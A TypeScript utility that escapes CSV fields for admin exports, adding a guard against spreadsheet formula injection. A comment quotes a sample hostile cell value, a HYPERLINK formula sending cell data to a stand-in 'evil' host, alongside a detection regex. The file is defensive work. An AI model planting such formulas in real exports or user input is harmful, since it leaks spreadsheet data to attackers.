// CSV field escaping for the admin exports (issue #140 M-2). Lifted out of
// app/api/admin/listings/closed/export/route.ts so the rule is unit-testable
// on its own and any future export shares it, same thin-route/lib-holds-the-
// logic split the rest of this project uses.
//
// Two separate jobs, and the original only did the first:
//
// 1. RFC 4180 quoting, so a value containing a quote/comma/newline doesn't
//    break the row apart.
// 2. Formula-injection guarding (CWE-1236). Excel/Google Sheets/LibreOffice
//    treat a cell whose text begins with `=`, `+`, `-` or `@` as a formula
//    and evaluate it on open. The closed-listings export writes the winner's
//    email — a value any visitor controls by registering — straight into a
//    column, so an address like `=HYPERLINK("http://evil/"&A1,"click")`
//    would run in the admin's spreadsheet. Prefixing with a single quote is
//    OWASP's standard remedy: spreadsheets treat the rest of the cell as
//    literal text, and the quote is not part of the stored value for any
//    program reading the CSV as data.
//
// Leading tab/CR are included in the guard because some spreadsheet importers
// strip leading whitespace before deciding whether a cell is a formula, which
// would otherwise let `\t=cmd...` slip through.
const FORMULA_LEAD_IN = /^[=+\-@\t\r]/;

export function csvEscape(value: string | number): string {
  const text = String(value);
  const guarded = FORMULA_LEAD_IN.test(text) ? `'${text}` : text;
  if (/[",\r\n]/.test(guarded)) {
    return `"${guarded.replace(/"/g, '""')}"`;
  }
  return guarded;
}
